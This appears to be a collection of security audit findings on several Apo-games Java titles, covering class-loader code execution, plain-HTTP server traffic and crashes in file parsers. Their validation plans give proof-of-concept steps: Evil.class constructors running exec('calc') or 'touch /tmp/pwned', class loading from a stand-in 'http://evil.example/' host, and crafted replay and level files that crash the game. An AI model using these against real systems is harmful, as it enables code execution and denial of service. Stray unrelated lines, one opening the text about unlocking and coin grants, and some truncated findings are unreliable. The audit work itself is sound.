Replace the id with 90 and stars 3 to confirm full unlock and coin grant on the next win tick.

title: Dead-code URLClassLoader that instantiates classes from arbitrary file/URL paths (theoretical remote/local code loading)
entry_point: None in this variant: repo-wide grep for 'ApoClassLoader|getMyClass' matches only the definition file itself (constructor at lines 19-22, getMyClass at 62-89). In applet mode the path would be an arbitrary URL (line 68), otherwise a filesystem path (line 66)
sink: cl.loadClass(classname) followed by c.newInstance() (ApoClassLoader.java:73-75) executes static initializers and the no-arg constructor of whatever class bytes are found at the configured location
data_path: Currently unreachable: no constructor call, no caller of getMyClass anywhere under the source root (verified by grep over all ~90 .java files). If a future clone-owner wires it to a server-supplied path (its Javadoc says 'load a class file at runtime'), the chain would be attacker-controlled path -> File/URL -> URLClassLoader -> newInstance() -> arbitrary bytecode execution
attack_scenario: As shipped: none (inert). Hypothetical: an attacker who could influence the path/classname arguments (e.g., a sibling variant pointing it at a codebase URL or a writable directory) serves Evil.class whose constructor drops malware; newInstance() runs it immediately with full user privileges
preconditions: Someone must first add a call site passing attacker-influencable path/classname; none exists today. Desktop Java imposes no sandbox, so once wired the payload runs unsandboxed
validation_plan: Reproduce the latent capability only: compile 'public class Evil { public Evil() throws Exception { new java.io.File("pwned.txt").createNewFile(); } }' into /tmp, then in a scratch harness call new ApoClassLoader("/tmp/","Evil").getMyClass() and observe pwned.txt appear - demonstrating what one added call site would arm. Confirm inertness in the shipping game with: rg -n 'new ApoClassLoader|getMyClass' over the source root returning only ApoClassLoader.java itself.

title: Progress 'achievements' cookie exchanged with apo-games.de cookies.php over plain HTTP
code_excerpt: achievements = ApoHelp.loadData(new URL(ApoSimpleSudokuConstants.PROGRAM_URL), ApoSimpleSudokuConstants.COOKIE_NAME);
entry_point: HTTP response body of http://www.apo-games.de/apoSudoku/cookies.php (PROGRAM_URL, ApoSimpleSudokuConstants.java:28), read by ApoHelp.loadData (org/apogames/help/ApoHelp.java:446-474, readLine at :465)
sink: Parsing loop at ApoSimpleSudokuLevelChooser.java:144-155 adds each comma-separated integer to this.solvedLevels (line 148); saveCookies() sends the same state back in cleartext (line 166 -> ApoHelp.saveData, ApoHelp.java:419-444)
data_path: init() (LevelChooser.java:39) spawns a thread (line 67-72) -> loadCookies() (line 133) -> ApoHelp.loadData(new URL(PROGRAM_URL), COOKIE_NAME) (line 137) -> loadData builds new URL(codebase + "cookies.php") (ApoHelp.java:452), openConnection() over http:// (:454), reads first response line (:465) -> returned String split on ',' and Integer.valueOf'd into solvedLevels (LevelChooser.java:146-149). Outbound path: solveLevel() -> saveCookies() (159) -> saveData (166) -> writes "SET=&name=apoSudoku_level&value=<levels>" to the connection output stream (ApoHelp.java:420-432)
attack_scenario: (1) Player runs the applet build (B_APPLET=true, set in ApoSimpleSudokuApplet.java:26 / ApoScreen.initApplet():162). On the level-chooser screen the client GETs cookies.php and later uploads solved-level IDs. (2) An on-path attacker (open WiFi, malicious ISP) or whoever controls/resolves www.apo-games.de (the domain is long-dead; no TLS, no pinning, so DNS hijack or expired-domain registration works outright) replies with e.g. '0,1,2,...,30,' and forges the player's solved-level record, or logs the upload to profile gameplay progress. Impact is bounded: solvedLevels only paints overlay circles in the chooser (render(), LevelChooser.java:277-283) - every level button is clickable regardless (mouseReleased(), lines 217-228) - so this is record/privacy tampering, not an unlock.
preconditions: Game must run in applet mode (both loadCookies and saveCookies early-return otherwise, LevelChooser.java:134/:160); attacker needs a network vantage point or control of apo-games.de DNS/registration. Desktop build never issues these requests.
validation_plan: Flip the applet path on (launch ApoSimpleSudokuApplet, or set ApoConstants.B_APPLET=true before init), map www.apo-games.de to 127.0.0.1 in /etc/hosts, run `nc -l 80` or a logging Python http.server. Open the level chooser: observe the raw request containing 'GET=&name=apoSudoku_level' in cleartext; answer with '0,1,2,' and observe red overlays on levels 1-3 - proving both the transport exposure and that server bytes become client game state.

title: Dead-code ApoClassLoader loads and instantiates classes from arbitrary file path or URL
code_excerpt: URLClassLoader cl = new URLClassLoader( new URL[] { url } );
entry_point: None in this variant: a tree-wide grep shows ApoClassLoader is never instantiated (no 'new ApoClassLoader'). By design (see sibling-variant pattern and the leftover '.class'-filter JFileChooser labeled 'load an ai', ApoSimpleSudokuGameComponent.java:29-32/:62-69) it would take a directory/file path or URL plus a class name.
sink: cl.loadClass(this.getClassname()) at line 73 followed by c.newInstance() at line 75 - arbitrary bytecode instantiation; url comes straight from getPath() (line 66: new File(path).toURI().toURL() for desktop, line 68: new URL(path) for applets)
data_path: getMyClass() (line 62) -> path/classname fields set via constructor/setters (19-22, 36-54) -> URLClassLoader over that location (69) -> loadClass (73) -> newInstance (75). Zero intermediate validation of path or classname.
attack_scenario: Not exploitable as shipped in THIS variant because nothing calls it - this is latent cloned library code. If any future/clone wiring passes a user- or download-supplied location (e.g. 'load AI class from disk/network' as in other Apo games), anyone who can place a .class file at that location gets it instantiated inside the game JVM: local tamperer executes code, or a malicious level/AI distribution channel achieves RCE.
preconditions: Someone must add a call site (or ship a sibling variant that has one) whose path/classname argument is influenced outside the trust boundary; then attacker needs write access to that filesystem location or control of that URL/host.
validation_plan: Static proof of dormancy: `grep -rn 'new ApoClassLoader' src/` returns nothing. Dynamic proof of danger if wired: create Evil.class with a constructor calling Runtime.getRuntime().exec("touch /tmp/pwned"), then invoke new ApoClassLoader(<dir-with-Evil>, "Evil").getMyClass(); observe /tmp/pwned created - demonstrating defineClass-equivalent execution from attacker-writable locations with no signature/integrity check.

title: Hand-rolled 'connected' chain-string parser has no length/digit/range validation (currently fed only by compile-time literals)
code_excerpt: int x = Integer.valueOf(String.valueOf(connected.charAt(st))); int y = Integer.valueOf(String.valueOf(connected.charAt(st + 1)));
entry_point: In THIS variant there is none: help.getConnected()[i] originates exclusively from hardcoded String literals in ApoSimpleSudokuLevelMake.java (e.g. lines 75-78); no file, network, or user input reaches it (grep confirms nothing extends ApoIO, so its FileInputStream/URL readLevel path, ApoIO.java:75-96, is never used).
sink: charAt(st+1) at line 114 throws StringIndexOutOfBoundsException on odd-length strings; Integer.valueOf at 113-114 throws NumberFormatException on non-digits; this.connected[y][x] = (byte)i at line 116 throws ArrayIndexOutOfBoundsException when a digit exceeds width-1; the lookahead at 121-123 reads charAt(st+3) guarded only by 'st + 2 < connected.length()' - off-by-one crash when length == st+3
data_path: ApoSimpleSudokuLevelMake.getLevel(level) (called from ApoSimpleSudokuGame.init():61) constructs ApoSimpleSudokuLevelHelp(width, connected, level) -> new ApoSimpleSudokuLevel(help) -> init() (level ctor, line 57-60) iterates each connected string two chars at a time (112-155) mapping coordinate pairs into the connected[][] grid. Any malformed element crashes the constructing thread.
attack_scenario: Theoretical in this build: a player cannot influence these strings - they are baked into the jar. The risk materializes only through reuse: the identical Level-class skeleton in sibling variants is fed from downloaded levels (get_level.php / readLevel), where a hostile server or edited level file supplying '00 1'-style odd-length, non-digit, or out-of-range pairs crashes the game thread (denial of service) at exactly this sink.
preconditions: For this variant: none can be met by an attacker - input is compile-time constant. To demonstrate the defect one must edit the source literal or port the parser to a sibling variant that loads levels externally.
validation_plan: Edit one literal in ApoSimpleSudokuLevelMake.getFirstLevel() from "00011021" to "0001102" (odd length), run ApoSimpleSudokuMain and start level 1: observe StringIndexOutOfBoundsException thrown from ApoSimpleSudokuLevel.init line 114 during construction - confirming the parser performs no format validation and fails closed only by accident of its current callers.

title: Arbitrary local bytecode executed via ApoSkunkmanClassLoader.defineClass, auto-reloaded from skunkman.properties at every startup
code_excerpt:
byte data[] = loadClassData(filename);
c = defineClass(data, 0, data.length);
entry_point: (a) JFileChooser '.class' selection -> ApoSkunkmanPanel.loadPlayer(int,String) (game/ApoSkunkmanPanel.java:435-448); (b) persisted strings aiOne..aiFour read from user-editable ./skunkman.properties (ApoSkunkmanConstants.java:292-295) applied automatically at launch by ApoSkunkmanPanel.loadStartProperties/loadStartPlayer (game/ApoSkunkmanPanel.java:102-128)
sink: defineClass(data,0,data.length) + c.newInstance() cast to ApoSkunkmanAI (ApoSkunkmanClassLoader.java:38-41), reached via new ApoSkunkmanClassLoader(path, classname).getAI() at game/ApoSkunkmanPanel.java:512
data_path: skunkman.properties 'aiOne' -> ApoSkunkmanConstants.AI_ONE -> Panel.loadStartPlayer -> Panel.loadPlayer(player,s) parses 'path\Name.class' into source/playerName/className -> private loadPlayer(player,path,classname,classN) -> ApoSkunkmanClassLoader.getAI() -> loadClass -> loadClassData(new File(root,filename)) -> defineClass -> newInstance; constructor/static init and later ai.think()/ai.load()/ai.save() run with full JVM privileges (no SecurityManager anywhere in the tree)
attack_scenario: The game is an AI-programming contest platform. An attacker posts a 'cool bot' zip containing Evil.class plus a skunkman.properties preset pointing aiOne at it. Victim extracts into the game dir and starts the game: the class instantiates before any gameplay, executing attacker code (file theft, reverse shell) with the victim's user rights. Alternatively anyone who can write to skunkman.properties (or swap the recorded path) turns the next launch into code execution.
preconditions: Desktop run (loadPlayer returns early if ApoConstants.B_APPLET, ApoSkunkmanPanel.java:425-427); attacker-supplied .class on disk reachable at the recorded path; properties file in working directory is writable/plantable.
validation_plan: Compile 'public class Evil extends apoSkunkman.ai.ApoSkunkmanAI' whose constructor does Files.write(Paths.get("pwned.txt"),"rce".getBytes()) (stub remaining abstract methods). Run the shipped jar, use the player 'load AI' button on Evil.class: pwned.txt appears. Then set aiOne=<abs-path>\Evil.class in skunkman.properties, relaunch: pwned.txt appears with zero interaction. Note also loadClass() is child-first (defineClass attempted before findSystemClass, lines 58-82), so a planted e.g. javax/swing class in the AI dir shadows application classes.

title: URLClassLoader-based ApoClassLoader supports loading classes from a remote URL (applet branch) but has no caller in this variant
entry_point: None wired up: repo-wide search shows ApoClassLoader is referenced nowhere outside its own file (only ApoSkunkmanClassLoader is used, at ApoSkunkmanPanel.java:512)
sink: URLClassLoader.loadClass + c.newInstance() (lines 73-75) over a plain-HTTP URL when B_APPLET==true
data_path: If ever called with B_APPLET=true: path string -> new URL(path) -> URLClassLoader -> loadClass -> newInstance. In the current build the call chain terminates: dead code inherited from the shared apogames library.
attack_scenario: Theoretical: if a future/sibling wiring passes an http:// path while running as applet (where the sandbox would normally be the only barrier), getMyClass() fetches and executes bytecode from that host over plaintext HTTP, enabling a network MITM to serve malicious classes. In this variant nothing reaches it.
preconditions: Someone must add a caller; would additionally require applet context or a codebase where B_APPLET is forced true. Java applet support itself is end-of-life.
validation_plan: Verify absence: grep the whole tree for 'new ApoClassLoader' / 'getMyClass' - only the definition matches. To demonstrate the hazard if ever revived: host a jar with an ApoSkunkmanAI subclass on a local HTTP server, call new ApoClassLoader("http://127.0.0.1:8000/","Evil").getMyClass() with B_APPLET=true, watch tcpdump show plaintext GET and the constructor execute.

title: Replay parser trusts attacker-controlled element count: unbounded allocation and NPE on truncated .rep files
entry_point: 'Load replay' button -> ApoSkunkmanPanel.loadReplay() (game/ApoSkunkmanPanel.java:566-573) opens a user-selected .rep file (JFileChooser filter 'rep', ApoSkunkmanGameComponent.java:36,79-82) and hands it to replayIO.readLevel(path)
sink: ArrayList<Byte> grown up to 2^31-1 iterations per player from ApoIO-provided DataInputStream (org/apogames/ApoIO.java:79-87); secondary sink: this.replay.setHelp(help) at ApoSkunkmanReplayIO.java:40 dereferences null if EOF struck before line 100
data_path: .rep bytes -> FileInputStream (ApoIO.readLevel, ApoIO.java:79-81) -> ApoSkunkmanReplayIO.readLevel(DataInputStream): int players (offset ~22) then four loops of [readInt count + count bytes]. EOFException is swallowed upstream (ApoIO.java:88-89), so parsing 'succeeds' after allocating everything the file could feed; a header claiming huge sizes forces the loop to churn through the entire remaining stream boxing one Byte object per input byte (~16-24x amplification). If EOF hits before line 100, field 'replay' stays null and line 40 throws NullPointerException out of loadReplay onto the EDT.
attack_scenario: Attacker shares a tournament-looking .rep that is a valid 30-byte header (players=4) followed by size=0x3FFFFFFF and a few MB of filler. Victim loads it: heap fills with boxed Bytes, game freezes/OOMs (concrete crash under default -Xmx). A second file truncated right after the header instead kills the EDT with an NPE. Both are one-click crashes from a file someone asked you to 'watch my replay'.
preconditions: Victim manually opens the crafted .rep via the replay dialog; desktop or applet alike (readLevel(String) uses disk path when !B_APPLET).
validation_plan: Craft file: DataOutputStream.writeInt(any type)/writeLong/writeBoolean/writeInt(time)/writeInt(players=4)/writeUTF('')/4x writeUTF('') then writeInt(0x7FFFFFFF) + 5MB of 0x00, repeat; run 'java -jar -Xmx64m' and load it -> OutOfMemoryError/hang observable in jconsole. Second file ends after the names arrays -> console shows 'Exception in thread AWT-EventQueue' NullPointerException at ApoSkunkmanReplayIO.readLevel(String) line 40 and the UI dies.

title: Level/replay editor data places players and goal at unvalidated byte coordinates, causing out-of-bounds array access and crash
entry_point: (a) 'Load Editorlevel'/auto-load of levels/lastLevel.skunk -> ApoSkunkmanPanel.loadLevel (game/ApoSkunkmanPanel.java:597-610, auto-loaded at :109-111); (b) crafted .rep with embedded editor level -> ApoSkunkmanModelGame.startReplay -> level.loadAndMakeReplayLevel (game/ApoSkunkmanModelGame.java:334-344, level/ApoSkunkmanLevel.java:803-820)
sink: OOB index into the fixed 15x15 level array at apoSkunkman/game/ApoSkunkmanModelEditor.java:202 (this.level[y][x][0] = PLAYER_ONE+i, y/x straight from getX()/TILE_SIZE during the mandatory makeEditorLevel() call at ApoSkunkmanPanel.java:606); second sink during play: level.getLevel()[y][x] at apoSkunkman/entity/ApoSkunkmanPlayer.java:498 before layBomb (:499), outside the try/catch that guards ai.think (:474-484)
data_path: .skunk/.rep bytes -> EditorIO.readLevel reads signed bytes for 4 player positions (lines 47-52) and goalX (67-70) -> setX/setY store raw pixel offsets (can be -128*32 .. 127*32). For replays the same values ride through ApoSkunkmanReplayHelp Point array (replay/ApoSkunkmanReplayIO.java:75-81) -> ApoSkunkmanReplay.makeLevelFromHelp sets player positions (replay/ApoSkunkmanReplay.java:127-130). No range check exists between parse and use; canPlayerGo bounds-checks only the destination tile (level/ApoSkunkmanLevel.java:666-674), never the current one.
attack_scenario: Attacker distributes a 'custom map pack': patching one position byte to 0x7F makes loading the level itself throw ArrayIndexOutOfBoundsException inside makeEditorLevel (instant crash on open). Variant B: coordinate 100 (in-bounds editor array, off-grid playfield) loads fine; once the round starts and that player lays a skunkman, ApoSkunkmanPlayer.thinkAI:498 indexes level[12][100] -> uncaught AIOOBE kills the game thread mid-tournament. Goal-point bytes likewise shift the win tile outside the grid so GoalX rounds can never be won.
preconditions: Victim opens the crafted .skunk or plays the crafted .rep; no privilege needed - these are ordinary shared-content files.
validation_plan: Hex-edit a valid lastLevel.skunk: byte at offset 5 (player 1 x) -> 0x7F. Launch, menu > Editor > Load: stack trace ArrayIndexOutOfBoundsException at ApoSkunkmanModelEditor.makeEditorLevel(ModelEditor.java:202). Then set it to 100 (0x64, within byte range, outside 15-wide grid), start a match with that player AI-controlled, press the lay key when he is 'standing' off-grid: AIOOBE at ApoSkunkmanPlayer.thinkAI(Player.java:498) and the game window freezes/dies.

title: Highscore get/save exchanged over plain HTTP, spoofable by network attacker
entry_point: Startup background thread ApoSlitherLinkPanel.loadLevels() (game/ApoSlitherLinkPanel.java:133-141) calls ApoHighscore.load(); editor upload calls ApoHighscore.save() (game/ApoSlitherLinkEditor.java:117-121)
sink: URLConnection to http://www.apo-games.de/apoSlitherLink/get_highscore.php and /save_highscore.php (URLs defined in org/apogames/ApoConstants.java:25-26, B_ONLINE hardcoded true at line 23)
data_path: ApoSlitherLinkPanel.loadLevels() -> new Thread() -> ApoHighscore.getInstance().load() -> new URL(HIGHSCORE_GETPHP).openConnection() -> DataInputStream(urlConn.getInputStream()).readLine(); responses stored raw into names/levels/solution lists. Upload path: ApoSlitherLinkEditor.mouseButtonFunction(UPLOAD) -> ApoHighscore.save(levelString, solvedLevelString, "Apo") -> printout.writeBytes().

validation_plan: Launch apoSlitherLink.ApoSlitherLinkMain under tcpdump/Wireshark: plaintext HTTP POST to www.apo-games.de/apoSlitherLink/get_highscore.php is visible at startup. In a lab, point www.apo-games.de to a local netcat/HTTP server returning three lines ('0404    ', 'aaaa', 'X') and observe a custom level appear in the Custom menu.

title: Server-supplied level strings parsed with unvalidated dimensions (crash / oversized allocations)
entry_point: HTTP response of get_highscore.php: each line becomes a level via ApoSlitherLinkPanel.loadLevels() -> ApoSlitherLinkLevels.addCustomLevel(String) (apoSlitherLink/level/ApoSlitherLinkLevels.java:177-184) with no validation

title: Hand-parsed local save file 'highscore.apo' triggers uncaught exceptions and unbounded image allocation at startup
entry_point: Local file 'highscore.apo' resolved against the process working directory, read at every launch: ApoSlitherLinkPanel.init() -> loadLevels() -> this.io.readLevel("highscore.apo") (game/ApoSlitherLinkPanel.java:127)
sink: makeSolvedImage() in apoSlitherLink/level/ApoSlitherLinkLevelsHelp.java:166-265 - loop indexes level.getLevel()[y][x] using dimensions parsed from the file's second string (lines 188-241) and allocates a BufferedImage sized by the first string (line 247)
data_path: highscore.apo -> ApoSlitherLinkLevelIO.readLevel(DataInputStream) (level/ApoSlitherLinkLevelIO.java:71-81: readInt size, then size pairs of readUTF level/solution strings) -> ApoSlitherLinkPanel.loadLevels():129-132 checkLevelsIsIn()/addCustomsLevels() -> help.setSolvedLevelString(...) and makeSolvedImage(level). (b) Memory exhaustion: thousands of consistent entries like level='2525'+625 spaces, solution='2525'+625 'a' chars each allocate ~2400x2400 px ARGB images (~23 MB) per entry from a ~2 KB file, exhausting the heap.

title: Unauthenticated level upload feeds a shared pool auto-downloaded by all clients
code_excerpt: ApoSlitherLinkEditor.this.bUpload = ApoHighscore.getInstance().save(ApoSlitherLinkEditor.this.getGame().getLevel().getCurrentLevel().getLevelString(), ...getSolvedLevelString(), "Apo");
entry_point: Editor 'Upload' button -> ApoHighscore.save() posts level/solution/name as form data; the same pool is downloaded by every client at startup via get_highscore.php
sink: save_highscore.php accepts arbitrary attacker-chosen level/solution strings (no signature, token, or auth visible in the client protocol; name is the constant "Apo", not a player identity)
data_path: ApoSlitherLinkEditor.mouseButtonFunction(UPLOAD) (lines 112-122) -> new Thread -> ApoHighscore.save() (help/ApoHighscore.java:55-97) -> printout.writeBytes("level=...&solution=...&name=Apo") in cleartext; victims later consume these strings through ApoSlitherLinkPanel.loadLevels() (see ApoSlitherLink-01/-02).
attack_scenario: An attacker scripts POSTs of crafted level strings (e.g. dimension bombs or garbage puzzles) directly to save_highscore.php - the game client itself performs no authentication, so neither does the minimal protocol. All players silently receive the poisoned entries as custom levels at next start; combined with ApoSlitherLink-02 this turns into a remote crash delivered through the official channel.
preconditions: save_highscore.php live and accepting submissions exactly as the client sends them (server-side behavior inferred from the client protocol; the PHP source is not in this repo).

If the original endpoint is offline, host a mirror and repoint DNS.

title: ApoClassLoader can instantiate classes from arbitrary URLs/filesystems but is dead code in this variant
entry_point: Constructor arguments (path, classname) - in non-applet mode a filesystem path, in applet mode any URL (lines 65-68)
sink: URLClassLoader.loadClass() followed by Class.newInstance() at lines 73-75: executes static initializers and the no-arg constructor of whatever class is found at the supplied location
data_path: Theoretically: attacker-controlled path/classname -> getMyClass() -> URLClassLoader over http:// or file:// URL -> loadClass -> newInstance -> attacker constructor runs with full user privileges. In THIS variant the chain is severed: repo-wide search finds no instantiation of ApoClassLoader and no caller of getMyClass(); the related ApoFileFilter("class") in ApoSlitherLinkComponent.java:30 hints at a removed loader feature.
attack_scenario: None exploitable as shipped. If a sibling variant clones this framework class and wires it to a server-supplied classname (the corpus' clone-and-own pattern), serving one HTTP response yields arbitrary code execution on the player's machine.
preconditions: For a future/cloned wiring only: some code must pass an attacker-influenced path/classname into ApoClassLoader and invoke getMyClass(); none exists in ApoSlitherLink today.
validation_plan: Static: rg 'ApoClassLoader|getMyClass' across the tree returns only the class definition itself. Dynamic confirmation would require first adding a caller, e.g. new ApoClassLoader("http://evil/","Evil").getMyClass(), then observing the constructor side effect - i.e. the weakness is latent, not reachable.

title: Server-supplied user-level string parsed with attacker-controlled array dimensions (crash/OOM)
entry_point: HTTP response of http://www.apo-games.de/apoSnake/get_level.php read line-by-line in ApoSnakeUserlevelsLoad.load() (_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevelsLoad.java:164-186); every 11th line (i%11==0) is taken verbatim as a level string and stored via ApoSnakeUserlevels.loadUserlevels() into ApoSnakeLevel.editorLevels (_from_jar_ApoSnake/apoSnake/game/level/ApoSnakeUserlevels.java:23-28)
sink: new int[height][width] at ApoSnakePuzzleGame.java:190 and l.charAt(y*level[0].length+x+2) at :196/:224
data_path: save_level.php upload by any player -> get_level.php download (ApoSnakeUserlevelsLoad.load) -> ApoSnakeUserlevels.getAllLevelsSorted (ApoSnakeUserlevels.java:41-52) -> ApoSnakeLevel.editorLevels -> menu button 'userlevels' (ApoSnakeMenu.java:61-62 setPuzzleGame(0,"",true)) -> ApoSnakePanel.setPuzzleGame (ApoSnakePanel.java:188) -> ApoSnakePuzzleGame.loadLevel (line 181 selects editorLevels[p[0]], then parses)
attack_scenario: 1) Attacker POSTs a crafted string such as '\uFFFF\uFFFF' + short body to save_level.php (the upload path ApoSnakeUserlevelsLoad.save(), lines 123-137, sends whatever string it is given with no auth and no format check visible client-side). 2) A victim starts ApoSnake; the background thread started in ApoSnakePanel.loadUserlevels() (ApoSnakePanel.java:121-129) downloads the level list. 3) Victim clicks 'userlevels'; loadLevel computes width=height=65439 from chars 0xFFFF and executes new int[65439][65439] (~17 TB request) -> OutOfMemoryError before any bounds issue; alternatively '\u0000\u0000' gives NegativeArraySizeException (48-96=-48), and any string shorter than width*height+2 gives StringIndexOutOfBoundsException at line 196. None of these is caught around loadLevel (callers ApoSnakePanel.setPuzzleGame/ApoSnakeMenu.mouseButtonFunction have no try/catch; Errors are not caught by the catch(Exception) in loadUserlevels either), so the game action dies / the thread crashes.
preconditions: Victim must have online mode enabled (ApoConstants.B_ONLINE=true by default, _from_jar_ApoSnake/org/apogames/ApoConstants.java:16) and click the 'userlevels' menu entry; the apo-games.de server must store/serve the crafted string unsanitized (cannot be verified from this repo; the client performs zero validation regardless).
validation_plan: Offline proof of the sink without network: instantiate ApoSnakePuzzleGame (or call loadLevel directly) with levelString "\u0000\u0000" - observe NegativeArraySizeException at ApoSnakePuzzleGame.java:190; with "dd5" - observe StringIndexOutOfBoundsException at line 196. Network proof: run mitmproxy/hosts-file redirect of www.apo-games.de, serve get_level.php with a body whose i%11==0 line is '\uFFFF\uFFFFx', launch the desktop jar (B_APPLET=false), click 'userlevels', observe OutOfMemoryError / terminated game thread.

title: All game-server traffic sent over plain HTTP (level upload/download, progress sync, audio, images)
code_excerpt:

public final static String USERLEVELS_SAVEPHP = "http://www.apo-games.de/apoSnake/save_level.php";
entry_point: Any on-path attacker between the player and www.apo-games.de (LAN attacker, rogue Wi-Fi AP, DNS hijack); also applies when the game runs as applet (ApoSnakeApplet.java:28 sets B_APPLET=true enabling ApoHelp.loadData/saveData against http://www.apo-games.de/apoSnake/cookies.php, ApoHelp.java:442/473, reached from ApoSnakePanel.java:82 and :111)
sink: urlConn = url.openConnection(); printout.writeBytes(content) in ApoSnakeUserlevelsLoad.save/load (ApoSnakeUserlevelsLoad.java:123-137, 164-179); same pattern in org/apogames/help/ApoHighscore.java:81-104 (dead code in this variant) and org/apogames/sound/AudioPlayer.java:68 (audio streamed from http://www.apo-games.de/apoPongBeat...) plus ImageIO.read(new URL(pic)) at org/apogames/image/ApoImage.java:91
data_path: Every online feature hardcodes http:// URLs: user-level download (feeds ApoSnake-01's parser), user-level upload (ApoSnakeEditor.uploadString -> ApoSnakeUserlevels.addLevel -> ApoSnakeUserlevelsLoad.save, ApoSnakeEditor.java:265-267), and applet-mode progress persistence (cookies.php). Response bodies are consumed raw: readLine() results become level strings (i%11==0), Integer.valueOf/Float.valueOf fields, and Integer.valueOf(load) progress (ApoSnakePanel.java:84). No TLS, no signature, no checksum anywhere in the download path.
attack_scenario: An attacker on the victim's network intercepts get_level.php responses (or DNS/ARP-hijacks www.apo-games.de) and serves arbitrary level strings, star/rating counts and names; combined with ApoSnake-01 this converts a network position directly into remote crash of every player behind the attacker. The attacker can also replay/inject save_level.php submissions to pollute the shared level pool and, in applet mode, rewrite the cookies.php progress value (e.g. inflate solved count) since there is no authentication or integrity protection on either direction.
preconditions: Network position on-path to the victim (or control of the actual apo-games.de server/DNS); B_ONLINE=true (default). Applet-only sinks additionally require the deprecated applet deployment.
validation_plan: Run mitmproxy in transparent mode, play the game while browsing user levels, confirm plaintext requests/responses for get_level.php appear in the proxy log; then return a modified level body and observe the altered content rendered/loaded in-game. For upload tampering, drop or alter a save_level.php POST and observe 'Uploading failed'/success flip (ApoSnakeEditor.java:266-270).

title: Level-unlock progress is an unprotected local int (and HTTP value in applet mode) trusted by the client
entry_point: Local filesystem: file named 'properties' created relative to the process working directory (user.dir), read via FileInputStream in org/apogames/ApoIO.readLevel (ApoIO.java:79) and deserialized with data.readInt() in ApoSnakeLevelIO.readLevel (ApoSnakeLevelIO.java:34). In applet mode the same value comes from http://www.apo-games.de/apoSnake/cookies.php via ApoHelp.loadData (ApoSnakePanel.java:82).
sink: solved flows into puzzle.setSolved(solved,false) (ApoSnakePanel.java:104) and then gates progression: getMaxCanChoosen() (ApoSnakePanel.java:208-210) bounds which built-in levels can be selected in ApoSnakePuzzleChooser (ApoSnakePuzzleChooser.java:129) and in ApoSnakePuzzleGame.loadLevel (line 171).
data_path: 'properties' file (4-byte big-endian int, nothing else - ApoSnakeLevelIO.writeLevel, line 28) -> ApoIO.readLevel -> ApoSnakeLevelIO.readInt -> loadPreferences -> ApoSnakePuzzleChooser.solved -> level-selection bound. No MAC/signature/hash of any kind; the corpus-typical MD5 helper exists (ApoHelp.getMd5Digest, ApoHelp.java:284) but is never called in this variant.
attack_scenario: A player who wants to skip levels opens '<working directory>/properties' in a hex editor, changes the 4 stored bytes to 00 00 00 63 (99), restarts the game and has all 28 built-in levels unlocked. Same trick works over the wire in applet mode by answering cookies.php with an arbitrary integer. Impact is confined to single-player progression because ApoHighscore is never invoked in this variant, so nothing cheated is submitted anywhere.
preconditions: Desktop mode: write access to the game's working directory (always true for the human running it; the relevant question for the research is simply that the trust anchor is client-held data). Applet mode additionally requires the legacy plugin environment.
validation_plan: Run the desktop jar once to create 'properties', quit, hex-edit the single int (e.g. xxd -r -p 00000063 > properties after truncating), relaunch, open level chooser and confirm access to the last level (maxCanChoosen now 99). Also verify the file contains exactly 4 bytes (od -An -tx1 properties).

title: URLClassLoader-based dynamic class instantiation helper present but unwired (theoretical remote/local class loading)
entry_point: Whatever String is passed to new ApoClassLoader(path, classname): in applet mode path is used as-is as a URL (line 68), otherwise converted from a File path (line 66). If any caller ever passed a server-controlled path/classname, the bytes fetched from that location would be defined and instantiated.
sink: cl.loadClass(...) followed by c.newInstance() at ApoClassLoader.java:73-75 - executing the loaded class' no-arg constructor with full privileges of the JVM (no SecurityManager, no package sealing, no code-signing check).
data_path: Grep of the entire variant shows zero references to ApoClassLoader outside its own file (verified: grep -rln ApoClassLoader matches only org/apogames/help/ApoClassLoader.java). Unlike sibling variants that reportedly feed it from network data, ApoSnake never constructs one, so there is no data flow from any entry point to this sink today.
attack_scenario: Theoretical only: were a future maintainer to call new ApoClassLoader("http://evil.example/", "Exploit").getMyClass() with any server-influenced argument (e.g. a downloaded level metadata field), hosting a .class file whose constructor runs arbitrary code would achieve remote code execution in the game process. As shipped, no such caller exists, so an attacker gains nothing through this file alone.
preconditions: Requires code changes: someone must add a call site feeding attacker-controlled path/classname. Not exploitable in the current build.
validation_plan: Confirm deadness: grep -rn 'ApoClassLoader' --include='*.java' . returns only its own definition (already done). To demonstrate the latent danger, compile a two-class PoC where a test harness invokes getMyClass() against a directory containing class Exploit{ public Exploit(){Runtime.getRuntime().exec("calc");} } and observe execution - proving that any future call site with remote input becomes RCE.

title: Replay (.rep) parser trusts attacker-chosen record count: readInt-driven allocation loop
entry_point: 'replayLoad' button -> ApoSoccerGame.button actions (ApoSoccerGame.java:889-892) -> ApoSoccerReplay.loadReplay() JFileChooser over user.dir/replays (_from_jar_ApoSoccer/apoSoccer/game/ApoSoccerReplay.java:63, 235-238) -> io.readLevel(s) on any user-selected .rep file, e.g. one downloaded from another player

data_path: malicious .rep bytes -> RandomAccessFile(s,"rw"):48 -> readUTF/readInt headers -> for each entity readPlayer(data):114 int size = data.readInt() with no bound vs remaining file length -> loop adds new ApoFloatPoint(readFloat,readFloat) up to 2^31-1 times; EOFException only surfaces after memory/CPU spent growing the list (~40x byte amplification with growth-doubling overhead)

title: Full-trust AI plugins can manipulate match outcomes: deliberate forfeit awards exactly 10 goals, and hung think() freezes the game thread
entry_point: Any loaded ApoSoccerAI's think(ball, ownTeam, enemies) - enemies expose player names via ApoSoccerEnemy.getName() (_from_jar_ApoSoccer/apoSoccer/entityForAI/ApoSoccerEnemy.java:73), letting an AI identify its opponent at runtime; think() is invoked every tick from ApoTeam.thinkAI (ApoTeam.java:483-497) inside thinkGame (ApoSoccerGame.java:1721-1744)
